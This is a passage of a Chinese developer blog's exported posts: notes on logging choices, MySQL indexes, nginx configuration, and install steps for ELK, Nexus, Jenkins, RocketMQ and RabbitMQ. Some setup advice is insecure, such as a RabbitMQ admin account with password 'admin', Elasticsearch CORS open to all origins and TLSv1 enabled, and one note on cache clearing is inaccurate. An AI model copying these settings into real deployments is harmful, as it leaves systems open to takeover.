基于j.u.l的facade使用基于logback-classic的facade使用基于log4j的facade使用 代码就去原文找吧、这里只是技术方案 原文链接]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>日志收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[日志服务的选型]]></title>
    <url>%2F2018%2F06%2F04%2Flog%2Flog-selected%2F</url>
    <content type="text"><![CDATA[众所周知. 日志系统分为：系统日志和业务日志业务日志又可分为请求日志和操作日志 系统日志1cpu、内存、请求量、当前连接数、连接时间等等 请求日志12345谁、请求那个系统上的什么资源、源ip系统id目标ip目标url 操作日志12345678910111213141516需求：各个子系统统一业务日志收集、这些日志消息包括： 操作系统标识 操作者 操作模块 操作类型 操作时间 操作内容 操作结果 简而言之：什么人在什么时候修改了什么系统上的哪些模块的哪些内容 who 、when、where、what、how、【4w1h】 至于why 日志是检测不出来的。。。 方案一：mysql+logback123456优点：简单随库、成本低;持久化不丢失、支持读写分离、缺点：表设计不free、一旦设计好就不能随意添加字段 不支持定时清理日志、占用数据库链接、 如果建立大量检索索引、添加数据要慢、如果索引较少、检索数据有不会很准确、现阶段mysql5.5以后使用innodb引擎、而这种引擎最大的优点就是支持了事务、变相的也降低了他的读写性能、但是在需求上不需要事务的支持、 方案二：mongdb+logback1234优点：支持定时清理、支持数据字段任意扩充【文档型】、 支持读写分离、检索识别度高、支持索引结构比较广泛、支持多种形式查询缺点：成本稍微高 比mysql数据库要贵点、 方案三：ELK 【ELK】 方案四：Splunk 方案五：Fluentd 一般用在 k8s 容器服务的日志收集CSDN linux 运维 方案六：Flume 博客园 方案六：KafKa+logback]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>日志收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kuberments]]></title>
    <url>%2F2018%2F06%2F04%2Fservice-mesh%2Fservice-mesh-2%2F</url>
    <content type="text"><![CDATA[pdf 文档 社区文档下载]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>service-mesh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么你成不了架构师]]></title>
    <url>%2F2018%2F05%2F30%2Fessay%2Fessay-8%2F</url>
    <content type="text"><![CDATA[近期入职新公司 接手架构重构 感慨颇多、也学到不少东西、学会了时间不使用timestamp 使用bigint、价格不使用decimal 而是int or bigint以前常念叨 适合业务的技术才是最好的技术、却少有感慨 为什么使用bigint作为时间单位？1231、首先兼容oracle、其次项目内部流转不容易异常【项目中是这个说法、貌似timestamp我也没碰到过异常】&lt;br&gt;2、还有就是int值比较容易比较 尤其针对范围查询 较快些吧、估计timestamp底层比较就是int方式 为什么使用int或者bigint作为价格单位 1、首先这点不能一定就说项目中就一定是对的、暂时没有想到以前的设计方案项目中的想法了解到、价格小数点取到后四位 1.0001元、2、当然decimal肯定可以甚至可以更好的decimal（10，5）这样的设计我觉得会更好事实上现在也出现了问题 总价格不能超过2100000.00000【int的最大值】 系统重构是痛苦的、后续任务中涉及表重构、需要设计索引、以前曾经擅自在项目表设计上加过联合索引、被领导小训了一顿、从此对之是挺害怕的、甚至到之前一直都不知道为什么错了、知识水平有限 回家路上是左思右想、有了这么几个猜测12345671、使用explian table查询表索引 联合索引两个字段有一个被索引另一个没有索引2、联合索引、更新表要更新索引缓存、而实际查询率并不高、 也就是说花费了巨大的代价去维护一个索引健、而用到的时候却比较少3、我擅自增加索引的表是用户表、用户表更新比较频繁、查询较少、 进一步增大了【2】的代价去干了不该干的事、4、一系列的骚操作、不知道底层就瞎搞胡搞、须知所有的设计都是有利有弊、 都是为了某些业务场景而设计、把不该用的配置用到不该用的业务上、就会与期望值南辕北辙 为什么你成不了架构师？ 每一个系统都有自己的业务需求、天下没有两片一样的叶子、也没有两个一样的系统、 即使业务需求一样、不同的程序员也会设计出不同的系统12345678910都在讲架构师要有两方面准备【技术架构】和【业务架构】技术架构：从最简单的LAMP【linux+apache tomcat+mysql+php】到SOA、 到微服务、以及各个组件的针对场景使用业务架构：这个是选择来的、不同的公司在做不同的业务、没有业务架构知识、 你连一个表都设计不出来、不了解业务面对老系统设计都不敢动、还谈什么架构？就像 我为什么在这使用中文：而不是英文: 因为中文间距宽 更易读、而使用英文 间距小 不容易读 只去关注技术的优缺点、永远成不了架构师、只有了解系统的特点、才能更好的设计出一个优秀的系统、又快又稳定。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql 索引]]></title>
    <url>%2F2018%2F05%2F30%2Fmysql%2Fmysql-indexes%2F</url>
    <content type="text"><![CDATA[mysql 索引 1234567891011121314151617181920212223242526单列索引1、普通索引--允许null和重复--优点就是查询快2、唯一索引--允许null 但是不可重复3、主键索引--不允许null 不可重复组合索引1、联合索引【组合索引】 多个字段创建一个索引健、只有最左边的索引被用到 联合索引才能被用到 索引最多包含16列全文索引1、全文索引 MyISAM 引擎独有 只能用在 char varchar text使用 检索文字关键字空间索引1、空间索引 针对空间数据类型的字段所建立的索引 MyISAM 引擎独有 空间引擎所在列 not null 支持数据类型 geometry、point、linestring、polygon 创建索引使用 spatial 关键字 纠正： MyISAM并InnoDB 支持空间类型的R-tree索引。 其他存储引擎使用B树来索引空间类型（除了 ARCHIVE不支持空间类型索引）。 所有的索引 必须合适业务使用在创建 对于更新频繁 检索较少的不得加除了主键索引之外的任何索引 徒增insert 和 update delete 消耗 B树和散列索引的比较 了解B树和散列数据结构可以帮助预测不同的查询在使用索引中的这些数据结构的不同存储引擎上的性能。 特别是用于MEMORY允许您选择B树或散列索引的存储引擎。 B树 区分大小 【小于 大于 大于等于 小于等于】 hash树 确定值【等于】 检索索引是否有效 explain]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 清空缓存]]></title>
    <url>%2F2018%2F05%2F30%2Fshell%2Fshell-3%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021 确认缓存或不用内存free -mvi drop_caches.sh#页面缓存echo 1 &gt; /proc/sys/vm/drop_caches#目录缓存和inodesecho 2 &gt; /proc/sys/vm/drop_caches#页面缓存，目录缓存和inodesecho 3 &gt; /proc/sys/vm/drop_caches#清理文件系统缓存syncsave sh drop_caches.sh 注意: 上述所有命令都对系统无害，且只会有助于释放不用的内存。 而且sync还会清理僵尸(zombie)对象和它们占用的内存。 但是，如果你执行这些命令时正在写数据，你实际上在数据到达磁盘之前就将它从文件缓存中清除掉了, 这可能会造成很不好的影响。 所以，为了避免这种事情发生，你可以echo值到/proc/sys/vm/vfs_cache_pressure中， 告诉内核，当清理inoe/dentry缓存时应该用什么样的优先级。 LinuxInSight对值的范围解释得很清楚: vfs_cache_pressure=100是默认值，内核会尝试重新声明dentries和inodes， 并采用一种相对于页面缓存和交换缓存比较”合理”的比例。 减少vfs_cache_pressure会导致内核倾向于保留dentry和inode缓存。 而增加vfs_cache_pressure超过100时，则会导致内核倾向于重新声明dentries和inodes 简而言之，小于100的值不会导致缓存的大量减少。超过100的值则会告诉内核你希望以高优先级来清理缓存。其实，无论你采用什么值，内核清理缓存的速度都是比较低的。如果将此值设置为10000，系统将会将缓存减少到一个合理的水平。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 监控服务脚本]]></title>
    <url>%2F2018%2F05%2F30%2Fshell%2Fshell-4%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021 #!/bin/shweblist=/shell/web_monit/weblist.txt for list in `cat $weblist|grep -E -v &quot;#|^$&quot;` dohttpcode=`curl -o /dev/null -s -w %&#123;http_code&#125; &quot;$list&quot;` httptime=`curl -o /dev/null -s -w &quot;time_connect: %&#123;time_connect&#125;\ntime_starttransfer: %&#123;time_starttransfer&#125;\ntime_total: %&#123;time_total&#125;\n&quot; &quot;$list&quot;|grep time_total|awk -F &quot;:&quot; &apos;&#123;print $2*1000&#125;&apos;`if [ $httpcode = 500 ]||[ $httpcode = 502 ]||[ $httpcode = 503 ]||[ $httpcode = 504 ]then curl -d &quot;mobile=13800008888&amp;text=访问 $list 超时&quot; &quot;http://127.0.0.1/sms/&quot;else echo &quot;$list is checked ok!&quot;fi if [ $httptime -ge 3000 ]then curl -d &quot;mobile=13800008888&amp;text=访问 $list 超时&quot; &quot;http://127.0.0.1/sms/&quot;else echo &quot;$list is connect ok!&quot;fidone 同目录下 建立 weblist.txt 12http:www.wuxinvip.comhttps://www.wuxinvip.com]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git error]]></title>
    <url>%2F2018%2F05%2F28%2Fessay%2Fgit-email%2F</url>
    <content type="text"><![CDATA[123git config --system --unset credential.helper之后重新配置 user.name user.email 123456git 提交错误The Git process exited with the code -1,073,741,819版本问题http://download.csdn.net/detail/huoyan403/9874429]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[base-cloud]]></title>
    <url>%2F2018%2F05%2F27%2Fspring-cloud%2Fbase-cloud%2F</url>
    <content type="text"><![CDATA[他屌任他屌、我吃他大鸟 他皮任他皮、把他当瓜皮 代码地址gitee代码地址github develop 分支【使用gradle开发、属于开发比较良好的版本】]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>开源项目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nexus部署]]></title>
    <url>%2F2018%2F05%2F26%2Fservice-deploy%2Fnexus%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334基本环境jdk8maven3.Xcurl -L -O https://sonatype-download.global.ssl.fastly.net/repository/repositoryManager/3/nexus-3.12.0-01-unix.tar.gztar zxvf nexus-3.9.0-01-unix.tar.gzmv nexus-3.9.0-01 /opt/env/nexus#修改端口vi nexus-default.properties#添加一个用户useradd -r nexus#切换用户su nexuscd /opt/env/nexus/bin./nexus start启动较慢su rootlsof -i:9000#java 7401 root 843u IPv4 106307 0t0 TCP pek1-vm-02:cslistener-&gt;10.1.5.154:54703 (ESTABLISHED)#java 7401 root 851u IPv4 91614 0t0 TCP *:cslistener (LISTEN)如果有以上两个进程成功]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>服务搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jenkins部署]]></title>
    <url>%2F2018%2F05%2F26%2Fservice-deploy%2Fjenkins%2F</url>
    <content type="text"><![CDATA[jenkins官网 123456789基本环境jdk8curl -L -O https://prodjenkinsreleases.blob.core.windows.net/redhat-stable/jenkins-2.121.1-1.1.noarch.rpmrpm -ivh jenkins-2.121.1-1.1.noarch.rpm]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>服务搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elasticsearch-xmind]]></title>
    <url>%2F2018%2F05%2F24%2Fsearch-engine%2Felasticsearch-xmind%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>search-engine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nutch简介]]></title>
    <url>%2F2018%2F05%2F24%2Fsearch-engine%2Fnutch-1%2F</url>
    <content type="text"><![CDATA[简介发展]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>search-engine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring-data-es源码]]></title>
    <url>%2F2018%2F05%2F24%2Fspring-cloud%2Fspring-data-es-1%2F</url>
    <content type="text"><![CDATA[12345678910spring-data-common 对接口进行了定义spring-data-es 对服务进行实现 封装es客户端学到的更多的是代码的书写吧各种服务封装学会了自己封装一个服务给业务部门调用]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>search-engine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elasticsearch-bean-setting]]></title>
    <url>%2F2018%2F05%2F24%2Fsearch-engine%2Felasticsearch-bean-setting%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#分片数index.number_of_shards#副本数index.number_of_replicas#是否设为影子副本（暂未研究）index.shadow_replicas#是否设为可分享文件系统（暂未研究）index.shard_filesystem#是否自动扩展副本（暂未研究）index.auto_expand_replicas#暂未研究index.blocks.read_only#暂未研究index.blocks.read#暂未研究index.blocks.write#暂未研究index.blocks.metadata#创建该index用到的Elasticsearch版本index.version.createdindex.version.created_string#更新该index用到的Elasticsearch版本index.verison.upgradedindex.version.upgraded_string#该index支持的最小lucene版本index.version.minimum_compatible#该index建立日期index.creating_dataindex.creating_data_string#该index的优先级index.priority#该index的uuid，唯一标识index.uuid#该index各索引的routing规则，采用何种Hash方式，默认使用Murmur3，还有一种普通的Hash算法index.legacy.routing.hash.type#routing计算是否使用type，内部计算shard id的方法已经废弃，建议不使用，不设置，默认false即可index.legacy.routing.use_type#该index的数据存储路径index.data_path#暂未研究#index.shared_filesystem.recover_on_any_node]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>search-engine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[负载均衡]]></title>
    <url>%2F2018%2F05%2F24%2Fload-balance%2Ftotal%2F</url>
    <content type="text"><![CDATA[负载均衡起源 将用户请求通过各种算法、均匀的分配到各个服务器上、以保证最大用户量的支撑、 同时服务实例又不会因为请求过载而gg 负载均衡工作模式 说起负载均衡工作模式就得从网络请求说起、因为他工作于用户到服务器的请求路径上 目前基本网络协议 http、【七层】 物理、数据链路、网络、应用层、等等、、、、 基于物理层的 就算是硬件负载均衡设备、在网卡端口上设置算法、均衡服务实例请求量 基于网络层的 一般较软件负载均衡设备 常用的 ：nginx 工作在 4和7层 既有网络层【端口监听】、也有应用层【端口转发】 负载均衡]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[负载均衡算法]]></title>
    <url>%2F2018%2F05%2F23%2Fload-balance%2Falgorithm%2F</url>
    <content type="text"><![CDATA[LVS十种算法4种静态算法1、RR 依次轮调 2、WRR 加权轮调 3、DH 目标地址hash 4、SH 源地址hash 6种动态算法1、 LC least connection 最小调用 2、 WLC 加权重LC 3、 SED 对WLC补充、加一、让其能够比较大小 4、 NQ never queue 5、LBLC DH+LC 使用于cache群 6、LBLCR 带有复制功能的LBLC 常见负载均衡算法随机12345678910111213141516public static String random() &#123; //重新建立一个map,避免出现由于服务器上线和下线导致的并发问题 Map&lt;String,Integer&gt; serverMap = new HashMap&lt;String,Integer&gt;(); serverMap.putAll(serverWeigthMap); //获取ip列表list Set&lt;String&gt; keySet = serverMap.keySet(); ArrayList&lt;String&gt; keyList = new ArrayList&lt;String&gt;(); keyList.addAll(keySet); java.util.Random random = new java.util.Random(); int randomPos = random.nextInt(keyList.size()); String server = keyList.get(randomPos); return server; &#125; 加权随机123456789101112131415161718192021222324public static String weightRandom() &#123; //重新建立一个map,避免出现由于服务器上线和下线导致的并发问题 Map&lt;String,Integer&gt; serverMap = new HashMap&lt;String,Integer&gt;(); serverMap.putAll(serverWeigthMap); //获取ip列表list Set&lt;String&gt; keySet = serverMap.keySet(); Iterator&lt;String&gt; it = keySet.iterator(); List&lt;String&gt; serverList = new ArrayList&lt;String&gt;(); while (it.hasNext()) &#123; String server = it.next(); Integer weight = serverMap.get(server); for (int i = 0; i &lt; weight; i++) &#123; serverList.add(server); &#125; &#125; Random random = new Random(); int randomPos = random.nextInt(serverList.size()); String server = serverList.get(randomPos); return server; &#125; ipHash12345678910111213141516public static String ipHash(String remoteIp) &#123; //重新建立一个map 比买你出现由于服务器上线和下线导致的并发问题 Map&lt;String,Integer&gt; serverMap = new HashMap&lt;String,Integer&gt;(); serverMap.putAll(serverWeigthMap); //获取ip列表list Set&lt;String&gt; keySet = serverMap.keySet(); ArrayList&lt;String&gt; keyList = new ArrayList&lt;String&gt;(); keyList.addAll(keySet); int hashCode =remoteIp.hashCode(); int serverListSize = keyList.size(); int serverPos = hashCode % serverListSize; return keyList.get(serverPos); &#125; 最小调用…]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx]]></title>
    <url>%2F2018%2F03%2F25%2Fload-balance%2Fnginx%2F</url>
    <content type="text"><![CDATA[原理 123一个主线程负责请求分发四个或者两个【可配置】子线程进行请求转发到端口 配置 支持并发量 1好像是大约支持50000 Pv/s 常用命令 12345678910service nginx startservice nginx stopservice nginx restartnginx -t /etc/nginx/conf.d/www.confnginx -s reloadnet start nginx net stop nginx docker中使用 12345678docker pull nginxdocker nginx -t docker nginx -s reloaddocker service nginx start 转发配置123456789101112conf.d/upstream.confupstream demo&#123; server 127.0.0.1:8080 weight=1;&#125;default.d/location.conflocation /demo/&#123; http_proxy:http://demo;&#125; 多域名配置1234567891011121314test.confserver &#123; listen 80; server_name test.baidu.com; location / &#123; proxy_set_header Host $http_host; proxy_pass http://127.0.0.1:8082/uc/; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125; 12345678910111213141516171819202122232425262728293031323334353637383940配置好了看看服务器443端口有没有配置安全组 【mmp 吃了小亏】 server &#123; listen 80; server_name 39.107.82.228;#防攻击 return 502; &#125; server &#123; listen 80; server_name www.example.com; return 301 https://www.example.com$request_uri; location / &#123;# proxy_set_header Host $http_host;# proxy_pass http://ip:port;# or http://example 使用upstream 转发# proxy_redirect off;# proxy_set_header X-Real-IP $remote_addr;# proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125; server &#123; listen 443; server_name www.example.com; ssl on; ssl_certificate &quot;/etc/nginx/cert/1526742087444.pem&quot;; ssl_certificate_key &quot;/etc/nginx/cert/1526742087444.key&quot;; ssl_session_timeout 5m; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; location / &#123; proxy_set_header Host $http_host; proxy_pass http://ip:port/; proxy_redirect off; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用户池系统 构思]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-design%2Fdesign-4%2F</url>
    <content type="text"><![CDATA[以年龄为例task 获取数据以年龄排序 将数据以list形式存放到redis中 key 可从配置中获取 . 为了安全不建议直接把key发送到前端.可在配置做一个等价替换 不同的key对应不同的分组数据 前端访问webapp 获取key的加密值 和 默认信息列表 获取不同排序 前端发送不同的key值即可 跑批任务最后可以在redis数据失效之前把数据存储到mysql优点:1.不需要修改webapp和webview2.只需要修改跑批任务(算法添加、不同算法对应的配置更新到cloud config)3.数据存储样式可用“配置_list”存储 问题:1.用户抢单后要削减用户列表.元列表并发存在修改问题解决:在最终抢单时候来后台查询已抢单列表就行.修不修改的有错误也没事. (使用mysql存储数据? 也不能解决这个问题 反而会触及mysql并发量问题) 目前方案:mysql主从复制.从”从sql”查询数据]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELK 搭建]]></title>
    <url>%2F2018%2F03%2F24%2Flog%2Felk-1%2F</url>
    <content type="text"><![CDATA[elasticsearch 安装 官方下载地址：https://www.elastic.co/downloads/elasticsearchlinux执行 ：1curl -L -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.0.0.tar.gz 下载解压 【建议使用zsh】 修改配置文件config/elasticsearch.yml 12345678910111213141516171819# 集群的名字 cluster.name: cloud# 节点名字 node.name: node-1 # 数据存储目录（多个路径用逗号分隔） path.data: /usr/local/logUtils/elasticsearch/es-data# 日志目录 path.logs: /usr/local/logUtils/elasticsearch/log#本机的ip地址network.host: 192.168.0.135 #设置集群中master节点的初始列表，可以通过这些节点来自动发现新加入集群的节点discovery.zen.ping.unicast.hosts: [&quot;192.168.161.128&quot;]# 设置节点间交互的tcp端口（集群）,(默认9300) transport.tcp.port: 9300 # 监听端口（默认） http.port: 9200 # 增加参数，使head插件可以访问es http.cors.enabled: true http.cors.allow-origin: &quot;*&quot; 运行 bin下的 elasticsearch 进行启动后台启动 bin/elasticsearch -d 启动结果如下 启动会遇到的问题1、非root权限启动新建用户 es然后把 elasticsearch 文件夹权限归给 新用户es1chown -R es:es elasticsearch 2、 软硬进程限制 max file descriptors [4096] for elasticsearch process likely too low, increase to at least [65536] 解决办法1vi /etc/security/limits.conf 文后添加 然后使用source 重新加载并使用 ulimit -n 查看 是否为 65536 如果还是1024 那么重新连接linux 试下 3、.max virtual memory areas vm.max_map_count [65530] likely too low, increase to at least [262144] 解决办法 ：12执行 ：sysctl -w vm.max_map_count=655360查看执行结果 ： sysctl -a | grep vm.max_map_count elasticsearch 插件 head 安装 下载head插件1234wget https://github.com/mobz/elasticsearch-head/archive/master.zip安装nodewget https://npm.taobao.org/mirrors/node/latest-v4.x/node-v4.4.7-linux-x64.tar.gztar -zxvf node-v4.4.7-linux-x64.tar.gz 配置环境变量安装 gruntcd /opt/elasticsearch-head-masternpm install -g grunt-cli //执行后会生成node_modules文件夹grunt是基于Node.js的项目构建工具，可以进行打包压缩、测试、执行等等的工作，head插件就是通过grunt启动 检查是否安装成功grunt -version 修改head 插件源码vi Gruntfile.js vi _site/app.js 文件较大 建议下载下来 使用文本编辑器查找或者使用命令替换localhost 为 你的ip 运行headhead根目录运行 npm install启动head grunt server后台启动 nohup grunt server &amp; Logstash 安装 官方下载地址 ：https://www.elastic.co/downloads/logstash12345678910111213141516171819202122linux安装：curl -L -O https://artifacts.elastic.co/downloads/logstash/logstash-6.0.0.tar.gzconfig 添加 配置文件vi logstash.confinput &#123; # stdin &#123; &#125; tcp &#123; # host:port就是上面appender中的 destination， # 这里其实把logstash作为服务，开启9250端口接收logback发出的消息 host =&gt; &quot;192.168.0.135&quot; port =&gt; 9250 mode =&gt; &quot;server&quot; tags :&gt; [&quot;tags&quot;] codec =&gt; json_lines &#125;&#125;output &#123; elasticsearch &#123; hosts =&gt; [&quot;localhost:9200&quot;] &#125; stdout &#123; codec =&gt; rubydebug &#125;&#125; 启动logstash1nohup ./logstash -f ../config/logstash.conf &amp; Kibana 安装 官方下载地址：https://www.elastic.co/downloads/kibana1curl -L -O https://artifacts.elastic.co/downloads/kibana/kibana-6.0.0-linux-x86_64.tar.gz 修改配置文件123456789vim config/kibana.ymlserver.host:&quot;192.168.0.135&quot;elasticsearch.url:http://192.168.0.135:9200启动kibanabin/kibana 启动服务 http://192.168.0.135:5601 至此 ELK服务单机版部署完成 springcloud 集成logback 引入pom123456&lt;!--日志发送logstash--&gt; &lt;dependency&gt; &lt;groupId&gt;net.logstash.logback&lt;/groupId&gt; &lt;artifactId&gt;logstash-logback-encoder&lt;/artifactId&gt; &lt;version&gt;RELEASE&lt;/version&gt; &lt;/dependency&gt; logback-spring.xml 123456789101112&lt;appender name=&quot;LOGSTASH&quot; class=&quot;net.logstash.logback.appender.LogstashTcpSocketAppender&quot;&gt; &lt;!-- destination 是 logstash 服务的 host:port， 相当于和 logstash 建立了管道，将日志数据定向传输到 logstash --&gt; &lt;destination&gt;192.168.0.135:9250&lt;/destination&gt; &lt;encoder charset=&quot;UTF-8&quot; class=&quot;net.logstash.logback.encoder.LogstashEncoder&quot;/&gt; &lt;/appender&gt; &lt;root level=&quot;INFO&quot;&gt; &lt;appender-ref ref=&quot;LOGSTASH&quot;/&gt; &lt;/root&gt;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>日志收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AMQP]]></title>
    <url>%2F2018%2F03%2F24%2Fagreement%2Famqp%2F</url>
    <content type="text"><![CDATA[AMQP，即Advanced Message Queuing Protocol、高级队列消息协议 一个提供统一消息服务的应用层标准高级消息队列协议,是应用层协议的一个开放标准,为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件不同产品，不同的开发语言等条件的限制。Erlang中的实现有 RabbitMQ等。 协议特性 123451、消息方向2、消息队列3、消息路由4、消息可靠性5、消息安全性 协议元素 1234561、producer---生产者2、consumer---消费者3、virtual host --虚拟主机4、exchange----交换器5、queue----消息队列6、message--消息 定义了 消息发送过程 以及消息系统必须的特性和具体的消息流转实现 发送方式 可以看看RabbitMQ 消息发送流程rabbitMQ严格按照AMQP协议定制实现的]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kafka-1.0.0版本]]></title>
    <url>%2F2018%2F03%2F24%2Fmessage-queue%2Fkafka-1%2F</url>
    <content type="text"><![CDATA[Kafka 1.0.0发布的主要内容如下。 0.10.0版本里开始引入的Streams API在1.0.0版本里继续演进，改进了builder API（KIP-120），新增了用于查看运行时活跃任务的API（KIP-130）和用于聚合分区的cogroupAPI（KIP-150）。增强的print()和writeAsText()方法让调试变得更容易（KIP-160）。其他更多信息可以参考Streams文档。 改进了Connect的度量指标（KIP-196），新增了大量用于健康监测的度量指标（KIP-188），并提供了集群的GloabalTopicCount和GlobalPartitionCount度量指标（KIP-168）。支持Java 9，实现更快的TLS和CRC32C，加快了加密速度，降低了计算开销。调整了SASL认证模块的错误处理逻辑（KIP-152），原先的认证错误信息现在被清晰地记录到日志当中。更好地支持磁盘容错（KIP-112），更优雅地处理磁盘错误，单个JBOD上的磁盘错误不会导致整个集群崩溃。0.11.0版本中引入的幂等性生产者需要将max.in.flight.requests.per.connection参数设置为1，这对吞吐量造成了一定的限制。而在1.0.0版本里，这个参数最大可以被设置为5（KAFKA-5949），极大提升了吞吐量范围。 关于新版本更多的变化可以查看发布说明，也可以下载源代码和二进制包（Scala 2.11、Scala 2.12）。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>消息中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RabbitMQ Exception]]></title>
    <url>%2F2018%2F03%2F24%2Fmessage-queue%2Frabbitmq-exception%2F</url>
    <content type="text"><![CDATA[需求@RabbitListener - defining queues from properties issues 1.5.RA版本修复 修复方式 spel表达式1@RabbitListener(queues = &#123;&quot;#&#123;&apos;$&#123;listener.channel&#125;&apos;.split(&apos;,&apos;)&#125;&quot;&#125;)]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>消息中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RabbitMQ test]]></title>
    <url>%2F2018%2F03%2F24%2Fmessage-queue%2Frabbitmq-test%2F</url>
    <content type="text"><![CDATA[累积 36万条消息堆积 启动消费端【单机】 开始消费time 00:52:28 结束时间00:54:40 测试环境 三台rabbit集群 两台持久化【n/2+1】 一台非持久化 queue两个 消费由业务房监听spring streamListener完成 总计366178消息 总计消费时间132s平均每秒2774条 单机实例消费水平收到限制 如果启动多实例消费 那么距离理论4000+4000+12000 = 20000条 有待考证 不过压力不大]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>消息中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RocketMQ]]></title>
    <url>%2F2018%2F03%2F24%2Fmessage-queue%2Frocketmq%2F</url>
    <content type="text"><![CDATA[解决问题 分布式各系统之间的消息通讯【一般用来解决事务性提交】 应用场景 各模块之间 消息调用、 高并发的数据落地 事务解决方案 使用方式 我的开源服务中集成代码 message-queue 模块 安装123curl -L -O https://github.com/alibaba/rocketmq/archive/v3.5.8.zipunzip v3.5.8.zip -d rocketmq 原理 xmind文档 生产环境遇到的问题 消息阻塞【扩consumer、查看log 是什么原因导致消息阻塞】 消息长时间不到达【优先级策略】 消息确认机制会影响消息消费速度、虽然保证了每条消费一次]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>消息中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Rabbitmq 安装]]></title>
    <url>%2F2018%2F03%2F24%2Fmessage-queue%2Frabbitmq-install%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829303132333435363738eralng官方地址 : https://github.com/rabbitmq/erlang-rpm/releasessocat官方地址 : https://centos.pkgs.org/7/lux/socat-1.7.3.2-5.el7.lux.x86_64.rpm.htmlrabbitmq 官方地址: http://www.rabbitmq.com/install-rpm.html下载命令erlang : curl -L -O https://github.com/rabbitmq/erlang-rpm/releases/download/v20.1.7/erlang-20.1.7-1.el7.centos.x86_64.rpmrpm -ivh erlang-20.1.7-1.el7.centos.x86_64.rpm安装: socatyum install socatrabbitmq : curl -L -O https://dl.bintray.com/rabbitmq/all/rabbitmq-server/3.7.0/rabbitmq-server-3.7.0-1.el7.noarch.rpmrpm -ivh rabbitmq-server-3.7.0-1.el7.noarch.rpm查看 rabbit状态service rabbitmq-server status启动rabbitservice rabbitmq-server start安装 web插件rabbitmq-plugins enable rabbitmq_management添加用户rabbitmqctl add_user admin admin给予管理权限rabbitmqctl set_user_tags admin administrator]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>消息中间件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【线程信息检查】]]></title>
